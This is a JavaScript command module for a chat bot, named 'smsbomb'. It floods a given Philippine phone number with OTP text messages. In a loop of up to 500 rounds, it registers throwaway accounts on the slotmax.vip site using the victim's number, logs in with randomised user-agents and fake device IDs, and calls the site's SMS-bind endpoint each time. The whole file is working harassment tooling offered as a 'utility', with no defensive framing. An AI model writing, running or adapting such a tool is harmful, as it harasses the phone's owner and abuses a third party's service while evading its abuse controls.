const axios = require('axios');
const randomUseragent = require('random-useragent');

module.exports["config"] = {
    name: "smsbomb",
    aliases: ["smsspam",
        "spamsms",
        "smsb",
        "otpb",
        "otpbomb"],
    isPrefix: false,
    version: "1.2.0",
    credits: "Kenneth Panio",
    role: 0,
    type: "utility",
    info: "Loop sending random SMS requests to a specified PH number, using dynamically created accounts.",
    usage: "[number] [times]",
    guide: "smsbomb 09123456789 5",
    cd: 10,
};

module.exports["run"] = async ({
    chat, args, font
}) => {
    const mono = (txt) => font.monospace(txt);

    if (args.length < 1) {
        return chat.reply(mono("❗ Usage: smsbomb [number] [times]"));
    }

    let number = args[0];
    const times = parseInt(args[1]) || 500;

    if (isNaN(times) || times < 1 || times > 500) {
        return chat.reply(mono("❗ Invalid number of times. It must be a positive integer, up to 500."));
    }

    if (number.startsWith("+63")) {
        number = number.slice(3);
    } else if (number.startsWith("63")) {
        number = number.slice(2);
    } else if (number.startsWith("0")) {
        number = number.slice(1);
    }

    if (!/^\d{10}$/.test(number)) {
        return chat.reply(mono("❗ Invalid PH phone number. Must be 10 digits starting with 09."));
    }

    const generateRandomString = (length) => {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    };

    const generateUuidDeviceId = () => {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r: (r & 0x3 | 0x8);
            return v.toString(16);
        });
    };

    const createAccount = async (username, password, phone) => {
        const data = {
            username,
            password,
            code: Date.now(),
            phone,
            areaCode: "63",
        };

        try {
            const response = await axios.post(
                'https://slotmax.vip/api/user/custom/register',
                data,
                {
                    headers: {
                        'User-Agent': randomUseragent.getRandom((ua) => ua.browserName === 'Firefox'),
                        'Accept': 'application/json, text/plain, */*',
                        'Content-Type': 'application/json',
                        'requestfrom': 'H5',
                        'deviceid': generateUuidDeviceId(),
                        'referer': `https://slotmax.vip/game`,
                    },
                }
            );
            return response.data;
        } catch (error) {
            console.error('Account creation error:', error.message);
            return null;
        }
    };

    const login = async (username, password) => {
        const data = {
            username,
            password
        };

        try {
            const response = await axios.post(
                'https://slotmax.vip/api/user/login',
                data,
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': randomUseragent.getRandom(function (ua) {
                            return ua.browserName === 'Firefox';
                        }),
                    },
                }
            );
            return response.headers['set-cookie'][0];
        } catch (error) {
            console.error('Login error:', error.message);
            return null;
        }
    };

    const sendSms = async (cookie, phone) => {
        const data = {
            phone,
            areaCode: "63"
        };

        try {
            const response = await axios.post(
                'https://slotmax.vip/api/user/sms/send/bind',
                data,
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': randomUseragent.getRandom(function (ua) {
                            return ua.browserName === 'Firefox';
                        }),
                        cookie,
                    },
                }
            );
            return response.data;
        } catch (error) {
            console.error('SMS send error:', error.message);
            return null;
        }
    };

    const sending = await chat.reply(mono("📨 Starting SMS BOMB..."));

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < times; i++) {
        const username = generateRandomString(12); // Random 12-character username
        const password = generateRandomString(16); // Random 16-character password
        const account = await createAccount(username, password, number);

        if (!account) {
            failCount++;
            continue;
        }

        const cookie = await login(username, password);

        if (!cookie) {
            failCount++;
            continue;
        }

        const result = await sendSms(cookie, number);

        if (result?.success) {
            successCount++;
        } else {
            failCount++;
        }
    }

    await chat.reply(mono(`✅ SMS BOMB complete! Sent: ${successCount} success, ${failCount} failed.`));
};